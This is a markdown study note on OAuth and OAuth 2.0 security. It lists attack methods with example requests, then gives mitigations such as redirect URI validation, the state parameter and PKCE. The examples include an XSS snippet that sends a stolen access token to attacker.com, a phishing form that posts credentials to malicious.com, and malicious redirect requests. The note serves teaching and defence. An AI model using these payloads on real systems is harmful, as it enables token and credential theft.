# OAUTH AND OAUTH 2.0

## OAUTH:
OAuth is an open standard for access delegation, allowing third-party applications to obtain limited access to user resources on a server without sharing credentials, enhancing security and user experience.

## OAUTH 2.0:
OAuth 2.0 is an authorization framework that enables third-party applications to obtain limited access to user resources on a server, using access tokens without sharing user credentials, enhancing security.

## DIffernce between oauth and oauth2.0:
OAuth 1.0 is a protocol for secure delegated access, requiring complex signatures. OAuth 2.0 simplifies the process, using tokens and providing better support for web and mobile applications.

## Methods to perform oauth
- ### Authorization Code Interception:

Attackers can intercept the authorization code during the OAuth flow if the redirect URI is not properly validated.
Example:

An attacker sets up a malicious redirect URI and tricks the user into authorizing the application. The attacker captures the authorization code and exchanges it for an access token.
plaintext
```text
GET /oauth/authorize?response_type=code&client_id=attacker_client_id&redirect_uri=http://malicious.com/callback
```
- ### Cross-Site Request Forgery (CSRF):

If the application does not implement anti-CSRF measures, attackers can trick users into authorizing an application without their consent.
Example:

An attacker crafts a link that initiates the OAuth flow:
```text
<a href="http://example.com/oauth/authorize?client_id=attacker_client_id&redirect_uri=http://malicious.com/callback">Authorize</a>
```
- ### Token Theft via Phishing:

Attackers can create a phishing site that mimics the legitimate OAuth provider to steal access tokens.
Example:

A user is directed to a fake login page that looks like the legitimate OAuth provider:
```text
<form action="http://malicious.com/steal_token" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```
- ### Access Token Leakage:

If access tokens are stored insecurely (e.g., in local storage), they can be stolen via XSS attacks.
Example:
```text
// Malicious script to steal token
const token = localStorage.getItem('access_token');
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token }),
    headers: { 'Content-Type': 'application/json' }
});
```
- ### Using Refresh Tokens:

Attackers can exploit refresh tokens if they are not properly secured, allowing them to obtain new access tokens.
Example:

If a refresh token is stolen, the attacker can use it to request new access tokens:
```
POST /oauth/token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&refresh_token=<stolen_refresh_token>&client_id=attacker_client_id
```
- ### Open Redirect Vulnerabilities:

If the OAuth provider does not validate redirect URIs properly, attackers can redirect users to malicious sites.
Example:

```text
GET /oauth/authorize?client_id=legitimate_client_id&redirect_uri=http://malicious.com/callback
```
- ### Scope Manipulation:

Attackers can manipulate the requested scopes to gain more access than intended if the server does not validate them properly.
Example:

```text
GET /oauth/authorize?response_type=code&client_id=legitimate_client_id&scope=read,write,admin
```
- ### Token Replay Attacks:

If access tokens are not properly invalidated after use, attackers can replay them to gain unauthorized access.
Example:
```text
GET /api/resource HTTP/1.1
Authorization: Bearer <stolen_access_token>
```

## MITIGATION OF OAUTH2.0

### 1. Use Secure Redirect URIs
- Validation: Always validate redirect URIs against a whitelist of pre-registered URIs. This prevents open redirect vulnerabilities.
- Exact Match: Ensure that the redirect URI matches exactly, including the scheme (HTTP/HTTPS), domain, and path.
### 2. Implement State Parameter
- CSRF Protection: Use the state parameter to maintain state between the authorization request and the callback. This helps prevent CSRF attacks by ensuring that the response is from the original request.
- Random Value: Generate a random value for the state parameter and validate it upon receiving the response.
### 3. Use PKCE (Proof Key for Code Exchange)
- Enhance Security: Implement PKCE for public clients (e.g., mobile apps) to prevent authorization code interception attacks. PKCE adds an additional layer of security by requiring a code verifier and code challenge.
- Code Challenge: The client generates a code challenge and sends it with the authorization request. The server verifies it when exchanging the authorization code for an access token.
### 4. Limit Scope and Permissions
- Principle of Least Privilege: Request only the necessary scopes for the application. Avoid requesting broad scopes that grant excessive permissions.
- User Consent: Clearly inform users about the permissions being requested and allow them to grant or deny specific scopes.
### 5. Secure Token Storage
- Use Secure Storage: Store access tokens and refresh tokens securely. For web applications, use HttpOnly and Secure flags for cookies. For mobile applications, use secure storage mechanisms.
- Avoid Local Storage: Do not store tokens in local storage, as they are vulnerable to XSS attacks.
### 6. Implement Short-Lived Access Tokens
- Token Expiration: Use short-lived access tokens to limit the impact of token theft. Implement refresh tokens to allow users to obtain new access tokens without re-authentication.
- Revocation: Provide a mechanism to revoke tokens when necessary, such as when a user logs out or changes their password.
### 7. Use Strong Client Authentication
- Client Secrets: For confidential clients, use strong client secrets and rotate them regularly. Avoid hardcoding secrets in the application code.
- Public Clients: For public clients (e.g., mobile apps), consider using PKCE to enhance security.
### 8. Monitor and Log OAuth Activities
-Logging: Implement logging for OAuth-related activities, including authorization requests, token exchanges, and revocations. Monitor logs for suspicious activities.
- Alerts: Set up alerts for unusual patterns, such as multiple failed login attempts or token reuse.
